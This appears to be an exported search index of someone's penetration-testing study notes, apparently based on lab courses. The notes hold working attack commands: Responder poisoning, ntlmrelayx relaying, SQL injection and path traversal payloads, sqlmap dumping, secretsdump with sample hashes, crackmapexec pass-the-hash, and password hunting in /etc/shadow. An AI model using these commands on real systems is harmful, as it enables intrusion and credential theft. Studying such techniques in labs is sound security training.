<p>mitm6</p>"},{"location":"offensive-security/3.%20Exploitation/AD/LLMNR%20Poisoning/","title":"LLMNR Poisoning","text":"<p>link local multicast name resolution What is the protocol?     used to identify hosts when DNS fails to do so      previously NBT-NS     key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responding to using responder     sudo responder -I (interface) -dwp     -d DHCP     -w wpad proxy server     -P ProxyAuth     -v verbose</p>"},{"location":"offensive-security/3.%20Exploitation/AD/SMB%20Relay%20Attack/","title":"SMB Relay Attack","text":"<p>What is it? how does it work?     instead of cracking the hashes we gathered during the LLMNR attack with responder, we can instead rely those hashes to specific machines and potentially gain access attack requirements      - SMB signing must be disabled or not enforced on the target       - reloyed user creds must be admin on machine for any real value</p> <p>after that we can use a took called ntlmrelayx.py to relay the hashes to other machines     we need a file of potential targets (targets.txt)     we can run command to start it         ntlmrelayx.py -tf targets.txt -smb2support     This will relay the hash found from one machine to all of the others in the target files and also SAM dump all hahses for all users found on that machine     can also use a -i (Interactive)  to spawn a shell on the machine         then need to bind to it (port and ip will be shown)             ex - nc 127.0.0.1 11002         from here we have a shell to do many things     we can also run commands directly from the relay script using -c \"command here\"         ex- -c \"whomai\"             this will take the hash and relay it to all </p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Command%20injection/","title":"Command injection","text":""},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Command%20injection/#lab-1-tcm-sec","title":"Lab 1 -TCM Sec","text":"<p>what is the application doing?     running a command from the server  https://www.notion.so/Command-injection-9b61eed534ee46fc8f0e487755b2439c?pvs=4</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Path_Traversal/","title":"Path Traversal or File path Traversal","text":""},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Path_Traversal/#info","title":"info","text":"<ul> <li>This happens when a web server tries to pull a file from thier interal database to display or use it on the web app.</li> <li>The server pulls the file from a specified directoy based on that specific web app.</li> <li>If there are no protections in place, we can try to have it pull and disaplay a file of our choice vs the file that they want Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:</li> <li>Application code and data.</li> <li>Credentials for back-end systems.</li> <li>Sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</li> </ul>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Path_Traversal/#examples","title":"examples","text":"<ul> <li>File path looks something like this<ul> <li>/loadImage?filename=File.txt</li> </ul> </li> <li>We can try to exploit this. <ul> <li>/loadImage?filename=../../../etc/hosts</li> </ul> </li> <li>windows<ul> <li>?filename=......\\windows\\win.ini</li> </ul> </li> </ul> <p>The amount of ../ (moving backword in said direcotry path) is dictated by the server/application (whereever files are stored)</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/Path_Traversal/#random-notes","title":"Random notes","text":"<ul> <li>if you are trying to get a file from a filepath that has spaces - (C:\\Program Files (x86)) - Use a + for the spaces in the file path<ul> <li>This is if you are using Burp</li> </ul> </li> </ul>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/SQL%20injection/","title":"SQL injection","text":"<p>log into the app user creds posted     send the Post request that get accepted as correct credentials to repeater once in repeater try the common injection to see if you get a correct response     - jeremy' or 1=1#     - jeremy\" or 1=1#</p> <p>The payload needs to be exactly correct to work     this is where we can bring in another tool to help Sqlmap      sqlmap -r  nothing looks exploitable <p>look around the application for something else what is the application doing and how is it doing it - The Webpage is trying to pull data from somewhere to display it on our screen or go start a process - depending on the datavase, that could be SQL we can inject code into the applicaion     - modifying sql commands to pull data from teh databases we should not be able to see         - all users, user info, passwords of other users, etc - How does it work? - what are the developers trying to accomplish?</p> <p>what to try</p> <ul> <li>try some quotes, multiple quotes, special characters to see how it works <pre><code>'OR 1 OR'\nJermey\u2019 or jermey\u201d or jermey#\njeremy\u2019 or 1=1#\n</code></pre></li> <li>if you get results back - indication of SQL injection</li> </ul> <p>Union</p> <p>grab data from other table that may not be provided <pre><code>jermey union select null, null, null#\n</code></pre> use the \u201cnull\u201d to see how many tables you can get back <pre><code>jeremy\u2019 union select null,null,null,table_name from informiation_schema.tables#\n</code></pre></p> <p>can use \u2019 union select null,null,version()# <p>log into the app user creds posted send the Post request that get accepted as correct credentials to repeater once in repeater try the common injection to see if you get a correct response <pre><code>jeremy' or 1=1#\njeremy\" or 1=1#\n</code></pre> The payload needs to be exactly correct to work this is where we can bring in another tool to help Sqlmap sqlmap -r  nothing looks exploitable <p>look around the application for something else what is the application doing and how is it doing it</p> <p>testing the session parameter to see if it is vulnerable to injection</p> <p>Using intruder to guess the first character of the password - Take the get request and copy and paste it into a txt file to put into sqlmap</p> <pre><code>sqlmap -r req.txt \u2014level=2\n##(need level too for session tokens)\n</code></pre> <p>That will give us the code we can use on the report or to plug into burp - we can then use \u2014dump to dump the database using that parameter - You can also use -T for the exact table name as shown her</p> <p>See additional notes with screenshots https://www.notion.so/SQL-injection-72eb1ee0a3494cb69a2eea492951d403?pvs=4</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/XSS/","title":"XSS","text":"<ul> <li>what is it?<ul> <li>allows the attacker to inject and execute javascript code in the browser of a user</li> <li>allows the attacker to take control of the application</li> </ul> </li> <li>what kinds?<ul> <li>reflected<ul> <li>code you are injecting comes from the current HTTP request</li> </ul> </li> </ul> </li> </ul> <ul> <li>you send a request, you get a response<ul> <li>the script is in the response</li> </ul> </li> <li>stored<ul> <li>payload is stored somewhere else<ul> <li>could be in a database to be used later</li> <li>or just on the server side</li> </ul> </li> </ul> </li> <li>DOM-based<ul> <li>everything happens in the browser</li> </ul> </li> <li>how to tell them apart?<ul> <li>DOM will only happen in the browsers, so there will not be any requests going to the server</li> <li>There will be no traffic in Burp or developer tools</li> </ul> </li> <li>AI definition(s) Stored XSS, where the malicious script is permanently stored on the target servers, and DOM-based XSS, where the vulnerability is in the client side code rather than the server side code.</li> </ul>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/XSS/#dom-lab-1","title":"DOM Lab #1","text":"<p>How to send a user to another website </p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/XSS/#stored-xss-lab","title":"Stored XSS LAB","text":"<p>We need to see if we have html injection first - [test] </p> <ul> <li>How do we know if its XSS<ul> <li>go to our separate container and see if it appears there</li> </ul> </li> </ul> <p> which it does without any commands  </p> <p>to see if its stored- go to the other container and refresh </p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/XSS/#challange","title":"Challange","text":"<p> - this script creates an image that loads from that url while brining along the document.cookie parameter or the admin_cookie</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/access_control/","title":"Access control","text":""},{"location":"offensive-security/3.%20Exploitation/Web%20apps/access_control/#what-is-it","title":"what is it?","text":"<p>Access control is the application of constraints on who or what is authorized to perform actions or access resources. - Authentication\u00a0confirms that the user is who they say they are. - Session management\u00a0identifies which subsequent HTTP requests are being made by that same user. - Access control\u00a0determines whether the user is allowed to carry out the action that they are attempting to perform. Broken access controls are common and often present a critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans so the potential for errors is high</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/access_control/#unprotected-functionality","title":"Unprotected functionality","text":"<p>At its most basic, vertical privilege escalation arises where an application does not enforce any protection for sensitive functionality. For example, a website might host sensitive functionality at the following URL: <pre><code>https://insecure-website.com/admin\n</code></pre></p> <p>n some cases, the administrative URL might be disclosed in other locations, such as the\u00a0<code>robots.txt</code>\u00a0file:</p> <p><pre><code>https://insecure-website.com/robots.txt\n</code></pre> Imagine an application that hosts administrative functions at the following URL:</p> <pre><code>https://insecure-website.com/administrator-panel-yb556\n</code></pre> <p>This might not be directly guessable by an attacker. However, the application might still leak the URL to users. The URL might be disclosed in JavaScript that constructs the user interface based on the user's role: You can inspect the page to look at the code of the website - poor coding can lead to unneccessary details being shown</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/access_control/#parameter-based-access-control-methods","title":"Parameter-based access control methods","text":"<p>Some applications determine the user's access rights or role at  login, and then store this information in a user-controllable location.  This could be:</p> <ul> <li>A hidden field.</li> <li>A cookie.</li> <li>A preset query string parameter.</li> </ul> <p>The application makes access control decisions based on the submitted value. For example:</p> <pre><code>https://insecure-website.com/login/home.jsp?admin=true\nhttps://insecure-website.com/login/home.jsp?role=1\n</code></pre> <p>This approach is insecure because a user can modify the value and  access functionality they're not authorized to, such as administrative  functions.</p>"},{"location":"offensive-security/3.%20Exploitation/Web%20apps/access_control/#horizontal-privilege-escalation","title":"Horizontal privilege escalation","text":"<p>Horizontal privilege escalation occurs if a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee can access the records of other employees as well as their own, then this is horizontal privilege escalation.</p> <p>Horizontal privilege escalation attacks may use similar types of  exploit methods to vertical privilege escalation. For example, a user  might access their own account page using the following URL:</p> <pre><code>https://insecure-website.com/myaccount?id=123\n</code></pre> <p>If an attacker modifies the <code>id</code> parameter value to that  of another user, they might gain access to another user's account page,  and the associated data and functions.</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Domain%20Enumeration/Bloodhound/","title":"Bloodhound","text":"<p><pre><code>pip install bloodhound\n</code></pre> bloodhound it always being updated needed for the latest and greates hacks</p> <p>first we need neo4j on  <pre><code>Sudo Neo4j console\n</code></pre> after we start it, it will give us a link of where it started on our computer     click the link and go to the IP/port first time you will be asked to login <pre><code>neo4j neo4j\n</code></pre> Then need to change your password (NEW PASSWORD neo4j1) next launch bloodhound <pre><code>sudo bloodhound\n</code></pre>         neo4j login in previous version, you had to manually gather the data with new versions, we can now use an ingested to gather it for us</p> <p>injester     sudo bloodhound-python          -d Domain         -u username         -p passwrod         -ns or DC         -c (what are we collecting) All     ex <pre><code>sudo bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;pass&gt; -ns $target -c All\n</code></pre></p>"},{"location":"offensive-security/4.%20Post-Expliotation/Domain%20Enumeration/Plumhound/","title":"Plumhound","text":"<p>go to plumhound on github     bloodhound for Blue and purple teams</p> <p>once youve copied the git need to install <pre><code>sudo pip3 install -r requirements.txt\n</code></pre></p> <p>NEED TO HAVE BLOODHOUND UP AND UPEN <pre><code>sudo python3 Plumhound.py --easy -p (neo4j password)\n</code></pre>     test to make sure there is connection</p> <p><code>` sudo python3 plumhound.py -x tasks/defult.tasks -p (neo4j pass)</code></p>"},{"location":"offensive-security/4.%20Post-Expliotation/Domain%20Enumeration/ldapdomaindump/","title":"Ldapdomaindump","text":"<p><pre><code>sudo ldapdomaindump ldaps://$target -u &lt;'domain\\username'&gt; -p &lt;userpassword&gt;\n</code></pre> dumps multiple files on info about the domain</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/AD/Dumping%20Hashes/","title":"Dumping hashes","text":"<p><pre><code>secretsdump.py &lt;DOMAIN/user&gt;: '&lt;password&gt;'@&lt;IP&gt;\n## Example\nsecretsdump.py MARVEL.local/tstark: 'Password2'@192.168.88.102\n## w/hash\nsecretsdump.py administrator:192.168.88.101 -hashes ad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f\n</code></pre> All accounts on the device besides: Guest, Default, WDGAUtilityAccount are worth looking at </p> <p>There is a chance to dump passwords in clear text     passwords stored in the registry - they will appear in clear text     if wdigest (older protocol)          enabled by default on older OS             want to find an older OS via info gathering              this process might be enabled by default when pentesting a real network, once we have a foothold on an acccount, use that account to spray the rest of the network, you can then find more accounts, and then spray again. this can allow you to finally find an domain admin or gain higher priv</p> <p>Cracking passwords     you only need the second portion (NT)      hashcast --help      hashcat --help | grep ntlm</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/AD/Pass%20the%20Password%20or%20Hash/","title":"Pass the Password or Hash","text":"<p>what are we doing?      we are taking the password that we already got, and we are passing it around to different machines and trying to use that to login</p> <p>tool ``` crackmapexec smb  -u  -d  -p  -H  --local-auth (what authentication mechanism are we using? )         -sam              we can dump the sam on every device we login to                 example                     we can take a local admin hash and use that to try and login to every machine on the network and dump thier SAM to try and get more credentials          --shares              we can see more shares on each devices             maybe there are others we were not aware of that are only on specific servers         --lsa             dump the local security authority          -M              modules          examples             crackmapexec smb 192.168.88.0/24 -u tstark -d MARVEL.local -p Password2         it also has a built in Database to house everything that you did             which machines you got into and what not             hashes dumped             accounts dumped <pre><code>secretesdump.py \n    this can dump the hashes whcih we can also send around the network\n</code></pre> <p>to view your database of all of the data you found while using crackmapexec     cmedb</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/AD/Token%20impersonatoin/","title":"Token impersonatoin","text":"<p>what are tokens      temporary keys that allow you to access to a system or network without having to provide credentials each time you access a file Types     - Delegate         - Created for logging into a machine or using Remote Desktop \\     - Impersonate          - \"non-interactive\" such as attaching a network drive or domain login script</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/Network/","title":"Network","text":"<p><pre><code>ip a\n</code></pre> **![[Pasted image 20240330135633.png]] <pre><code>ip route\n</code></pre> ![[Pasted image 20240330135701.png]] <pre><code>arp command \narp -a\n</code></pre> <pre><code>ip neigh\n</code></pre> ![[Pasted image 20240330135754.png]] <pre><code>netstat ano\n</code></pre> ![[Pasted image 20240330135834.png]]</p> <p>r</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/Resources/","title":"Resources","text":""},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/Resources/#public-resources","title":"Public Resources","text":"<p>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</p> <p>https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</p> <p>https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/System%20enumeration/","title":"System enumeration","text":""},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/System%20enumeration/#kernal-info","title":"Kernal Info","text":"<pre><code>uname -a\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/System%20enumeration/#linux-full-version-details","title":"linux full version details","text":"<p><pre><code>cat /proc/version file\n</code></pre> cpu info <pre><code>lscpu\n</code></pre></p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/System%20enumeration/#services","title":"Services","text":"<pre><code>ps aux\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/automated%20tools/","title":"Automated tools","text":"<p>LinPeas -\u00a0https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</p> <p>LinEnum -\u00a0https://github.com/rebootuser/LinEnum</p> <p>Linux Exploit Suggester -\u00a0https://github.com/mzet-/linux-exploit-suggester</p> <p>Linux Priv Checker -\u00a0https://github.com/sleventyeleven/linuxprivchecker</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/password%20hunting/","title":"Password hunting","text":"<p>grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2&gt; /dev/null</p> <p>![[Pasted image 20240330140156.png]]</p> <p>locate password | more ![[Pasted image 20240330140349.png]]</p> <p>find / -name authorized_keys 2&gt; /dev/null ![[Pasted image 20240330140507.png]]</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/","title":"User","text":"<p>who are we? what permissions do we have? what can we do  <pre><code>whoami\nID\n</code></pre></p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#sudo-permissions","title":"sudo permissions","text":"<pre><code>sudo -l\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#file-that-stores-hashes","title":"file that stores hashes","text":"<pre><code>cat /etc/passwd\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#file-that-stores-passwrods","title":"File that stores passwrods","text":"<pre><code>/etc/shadow\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#history-of-all-commands-ran-in-bash","title":"history of all commands ran in bash","text":"<pre><code>history\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#login-to-sudo-account","title":"login to sudo account","text":"<pre><code>sudo su -\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#find-group-id","title":"find group ID","text":"<p><pre><code>find / -group &lt;group&gt; 2&gt;/dev/null\n</code></pre> find anything with that group name in the entire direcory</p>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#permissions-of-a-file","title":"permissions of a file","text":"<pre><code>ls -la &lt;file/path&gt;\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Linux/user/#file-type","title":"file type","text":"<pre><code>file &lt;file/path&gt;\n</code></pre>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Windows/Enumeration/","title":"Enumeration/information gathering","text":""},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Windows/Enumeration/#how-to-get-system-information","title":"How to get system information","text":"<ul> <li>systeminfo</li> </ul>"},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Windows/Resources_/","title":"Resources","text":""},{"location":"offensive-security/4.%20Post-Expliotation/Pri%20Esc/Windows/Resources_/#resources","title":"Resources","text":"<p>absolomb priv esc guide</p> <p>Payloads all the thing</p> <p>Fuzzy Security</p> <p>sushant 747s Guide</p>"}]}